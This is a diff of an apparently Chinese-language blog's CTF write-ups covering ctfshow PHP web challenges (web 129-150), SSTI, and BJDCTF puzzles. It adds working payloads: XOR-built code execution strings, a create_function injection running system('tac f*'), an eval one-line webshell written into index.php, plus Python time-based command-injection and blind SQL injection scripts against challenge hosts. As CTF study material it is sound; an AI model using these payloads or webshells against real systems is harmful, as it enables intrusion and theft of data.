@@ -1033,7 +1033,7 @@
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">假如你的没有国际化的程序里有这样的代码，echo &quot;你好&quot;;,而国际化的程序你要写成 echo gettext(&quot;你好&quot;);，然后再在配置文件里添加“你好”相对应的英文“Hi”。</span><br><span class="line">这时，中国地区浏览都会在屏幕上输出“你好”，而美国地区浏览都会在屏幕上输出“Hi”。也就是说，最终显示什么是根据你的配置文件而定的，如果找不到配置文件，才会输出程序里面的内容。</span><br></pre></td></tr></table></figure>
 
 <p>这样我们就可以查看后面文件中的内容</p>
-<p>_(get_defined_vars之后就会变成</p>
+<p>_(get_defined_vars)之后就会变成</p>
 <p>call_user_func(get_defind_vars)直接会返回已经定义的变量数组</p>
 <h3 id="web-129"><a href="#web-129" class="headerlink" title="web 129"></a>web 129</h3><p>题目得到意思是我们输入的f里面一定要包含ctfshow而且不能在第一位，而且运用的是readfile函数，那么我们就可以想到这个题目意思应该是我们需要猜测flag所在目录，因为必须要包含ctfshow，那么就应该是有一个ctfshow文件夹的存在，我们直接退出目录然后从根目录打开/vat/www/html/flag.php</p>
 <h3 id="web-130"><a href="#web-130" class="headerlink" title="web 130"></a>web 130</h3><p>.表示任意单个字符，+表示必须匹配1次或多次，+?表示 重复1次或更多次，但尽可能少重复</p>
@@ -1104,7 +1104,41 @@
 <p>附上payload脚本：</p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">result = <span class="string">&quot;+++++++++++&quot;</span></span><br><span class="line">url = <span class="string">&#x27;http://33f5eb0a-181b-4cbf-8014-74a54f04a425.challenge.ctf.show/?c=&#x27;</span></span><br><span class="line"><span class="built_in">str</span> = <span class="string">&quot;ctfshowabdegijklmnpqrtuvxyz-&#123;&#125;0123456789&quot;</span></span><br><span class="line"><span class="comment">#for i in range(1,5):</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">        <span class="keyword">for</span> m <span class="keyword">in</span> <span class="built_in">str</span>:</span><br><span class="line">            <span class="comment">#payload = &#x27;if [ `ls / -1 | cut -c %d | awk &quot;NR==4&quot; ` == &quot;%s&quot; ];then sleep 4;fi&#x27; % (j,m)   #f149_15_h3r3</span></span><br><span class="line">            payload = <span class="string">&#x27;if [ `cat /f149_15_h3r3 |cut -c %d ` == &quot;%s&quot; ];then sleep 4;fi&#x27;</span> %(j,m)</span><br><span class="line">            target = url + payload</span><br><span class="line">            <span class="comment">#print(target)</span></span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                io = requests.get(target,timeout=(<span class="number">3</span>))</span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                result += m</span><br><span class="line">                <span class="built_in">print</span>(result)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    result+=<span class="string">&quot; &quot;</span></span><br></pre></td></tr></table></figure>
 
-<h3 id="web-140"><a href="#web-140" class="headerlink" title="web 140"></a>web 140</h3><h2 id="SSTI"><a href="#SSTI" class="headerlink" title="SSTI"></a>SSTI</h2><h3 id="web-361"><a href="#web-361" class="headerlink" title="web 361"></a>web 361</h3><p>这里跳了一下，看一下模板，ssti</p>
+<h3 id="web-140"><a href="#web-140" class="headerlink" title="web 140"></a>web 140</h3><p>松散比较==:</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">0==&#x27;ctfshow&#x27;为真（8.0.0之后为假）</span><br><span class="line">所以我们需要$code为0</span><br><span class="line">也就是说我们只需要一个没有返回值的函数拼接就行了</span><br><span class="line">官方：usleep</span><br><span class="line">也可以使用两个system或者sleep什么的</span><br></pre></td></tr></table></figure>
+
+<h3 id="web-141"><a href="#web-141" class="headerlink" title="web 141"></a>web 141</h3><p>url编码的构造形式：但字符串的ascii吗16进制前加%</p>
+<p>用^构造出我们需要的字符，但是如何执行呢</p>
+<p>构造异或之前写过，可以去翻翻</p>
+<p><code>特性：运算符中间含有语句的时候可以一样执行</code></p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">phpinfo()</span><br><span class="line">1+phpinfo()+1</span><br><span class="line">其中的phpinfo会一样执行</span><br></pre></td></tr></table></figure>
+
+<h3 id="web-142"><a href="#web-142" class="headerlink" title="web 142"></a>web 142</h3><p>数字构造，直接构造0e在转换成int的时候会被判断为0，（—好像直接是0也可以—）</p>
+<h3 id="web-143"><a href="#web-143" class="headerlink" title="web 143"></a>web 143</h3><p>无字符RCE：</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">strr = &#x27;`!@#\^*=&quot;\&#x27;()[],/&lt;&gt;?:&#x27;</span><br><span class="line"></span><br><span class="line">for i in strr:</span><br><span class="line">    for j in strr:</span><br><span class="line">        for m in strr:</span><br><span class="line">            print(chr(ord(i)^ord(j)^ord(m)) +&#x27;=%&#x27;  + str(hex(ord(i)))[2:]  +&#x27;^%&#x27; +str(hex(ord(j)))[2:] + &#x27;^%&#x27; + str(hex(ord(m))))[2:]</span><br></pre></td></tr></table></figure>
+
+<p>然后拼凑就好了</p>
+<h3 id="web-144"><a href="#web-144" class="headerlink" title="web 144"></a>web 144</h3><p>过滤从V3变成了V2但是对V2的过滤消失了，所以我们可以把刚刚v3的payload放到v2，然后v3的长度要等于1直接构造<code>1-v2</code>就行了</p>
+<h3 id="web-145"><a href="#web-145" class="headerlink" title="web 145"></a>web 145</h3><p>三目运算符的妙用：</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">return 1?phpinfo():1;</span><br><span class="line">执行phpinfo（）</span><br></pre></td></tr></table></figure>
+
+<h3 id="web-146"><a href="#web-146" class="headerlink" title="web 146"></a>web 146</h3><p>增加了：过滤，可以用等号然后||绕过</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">eval(&quot;return 1==phpinfo()||1&quot;);</span><br></pre></td></tr></table></figure>
+
+<p>也会执行phpinfo</p>
+<h3 id="web-147"><a href="#web-147" class="headerlink" title="web 147"></a>web 147</h3><p>使用创建函数<code>/create_function</code>前面添加/作用不仅是绕过，这是默认的命名空间，所有原生类以及函数都在这里，我们调用函数的时候其实是调用了一个相对路径的函数命，如果前面添加了一个/那么我们再调用函数的时候我们就必须加上/使用它的相对路径；</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">create_function()用法</span><br><span class="line"><span class="meta">$</span><span class="bash">a = create_function(<span class="string">&#x27;$b&#x27;</span>,<span class="string">&#x27;return 1;&#x27;</span>)相当于</span></span><br><span class="line">function $a($b)&#123;</span><br><span class="line">return 1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>所以我们直接构造</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">post:ctf=create_function()</span><br><span class="line">get:show=;&#125;system(&#x27;tac f*&#x27;);##首先先闭合这个函数然后添加我们需要的代码,最后把后面的那个&#125;注释</span><br></pre></td></tr></table></figure>
+
+<h3 id="web-148"><a href="#web-148" class="headerlink" title="web 148"></a>web 148</h3><p>可以直接使用上面的^拼凑，过滤换一下就行</p>
+<p>wp是直接用上面的那些构造_GET然后用中文作为变量名，进行变量替换执行函数；</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash">哈=<span class="string">&quot;`&#123;&#123;&#123;&quot;</span>^<span class="string">&quot;?&lt;&gt;/&quot;</span>;<span class="variable">$&#123;$哈&#125;</span>[嘿](<span class="variable">$&#123;$哈&#125;</span>[呜]);&amp;嘿=system&amp;呜=cat%20flag.php</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="web-149"><a href="#web-149" class="headerlink" title="web 149"></a>web 149</h3><p>题目会将除了index.php文件意外的所有文件都删除（当前目录下），但是它中间给我们留了一行文件写入，我们可以直接在index.php文件中写入一句话木马。</p>
+<p>payload:<br><code>get:ctf=index.php post:show=&lt;?php eval($_POST[1]); ?&gt;</code></p>
+<h3 id="web-150"><a href="#web-150" class="headerlink" title="web 150"></a>web 150</h3><h2 id="SSTI"><a href="#SSTI" class="headerlink" title="SSTI"></a>SSTI</h2><h3 id="web-361"><a href="#web-361" class="headerlink" title="web 361"></a>web 361</h3><p>这里跳了一下，看一下模板，ssti</p>
 <p>题目的提示：名字就是提示，我们只需要在网页的后面以get方式传入一个值就行了</p>
 <p>既然是ssti那么我们直接测试一下49看一下</p>
 <p>如果返回的是7777777那么就是jinjia2</p>
@@ -1949,6 +1983,18 @@
 <p>显而易见这就是一个盲注了，构造payload脚本：（因为查找过于慢，照着之前写的finalsql注入的脚本改的）</p>
 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url = &quot;http://b49b6771-4b40-4bd5-8959-4bea5ae5fd40.node4.buuoj.cn:81/index.php&quot;</span><br><span class="line"></span><br><span class="line">data = &#123;&quot;username&quot;: &quot;admin\\&quot;, &quot;password&quot;: &quot;&quot;&#125;</span><br><span class="line">result = &quot;&quot;</span><br><span class="line">i = 0</span><br><span class="line"></span><br><span class="line">while (True):</span><br><span class="line">    i = i + 1</span><br><span class="line">    head = 32</span><br><span class="line">    tail = 127</span><br><span class="line"></span><br><span class="line">    while (head &lt; tail):</span><br><span class="line">        mid = (head + tail) &gt;&gt; 1</span><br><span class="line"></span><br><span class="line">        # payload = &quot;or/**/if(ascii(substr(username,%d,1))&gt;%d,1,0)#&quot;%(i,mid)</span><br><span class="line">        payload = &quot;or/**/if(ascii(substr(password,%d,1))&gt;%d,1,0)#&quot; % (i, mid)</span><br><span class="line"></span><br><span class="line">        data[&#x27;password&#x27;] = payload</span><br><span class="line">        r = requests.post(url, data=data)</span><br><span class="line"></span><br><span class="line">        if &quot;stronger&quot; in r.text:</span><br><span class="line">            head = mid + 1</span><br><span class="line">        else:</span><br><span class="line">            tail = mid</span><br><span class="line"></span><br><span class="line">    last = result</span><br><span class="line"></span><br><span class="line">    if head != 32:</span><br><span class="line">        result += chr(head)</span><br><span class="line">    else:</span><br><span class="line">        break</span><br><span class="line">    print(result)</span><br></pre></td></tr></table></figure>
 
+<h2 id="Schrodinger"><a href="#Schrodinger" class="headerlink" title="Schrödinger"></a>Schrödinger</h2><p>题目有一段很长的话，翻译一下大概就是，这个网站可以爆破出各种网站的密码之类的，留下了一个文本框，可能是要我们爆破什么网栈的密码，有一个input输入，以及一个check，如果再未完成之前check可能会失败。</p>
+<p>题目就是这个意思，现在应该要做的就是网站需要我们爆破的是什么密码：</p>
+<p>在复制文本翻译的时候，意外发现了隐藏的一句话，被标白色了：</p>
+<p><img src="/2022/03/16/BJDCTF%E5%A4%8D%E7%8E%B0/9.png" alt="1"></p>
+<p>打开看一下</p>
+<p><img src="/2022/03/16/BJDCTF%E5%A4%8D%E7%8E%B0/10.png" alt="1"></p>
+<p>也就是我们需要爆破这个网站了，输入网站开始等待。</p>
+<p>等待了很久发现很慢很慢好像没有什么用，之前点了check发现又得重来，所以抓个包看看</p>
+<p><img src="/2022/03/16/BJDCTF%E5%A4%8D%E7%8E%B0/11.png" alt="1"></p>
+<p>发现比input之前多了一段代码，%3D是<code>==</code>很明显是base64编码，拿去解密一下看到是一个时间的编码，那我们这里出现的时间说明，这个解密应该是虚假的，但是时间应该是多少呢，既然他根据时间来，我们把时间删了他是不是可以直接出来flag？删除</p>
+<p><img src="/2022/03/16/BJDCTF%E5%A4%8D%E7%8E%B0/12.png" alt="1"></p>
+<p>可以看到有一个av号，打开看下哦吼：量子力学，一个正经课程，flag应该不会藏在视频里面，去评论区看看找到了flag(不得不说真阴间啊)</p>
 ]]></content>
       <tags>
         <tag>BJDCTF</tag>
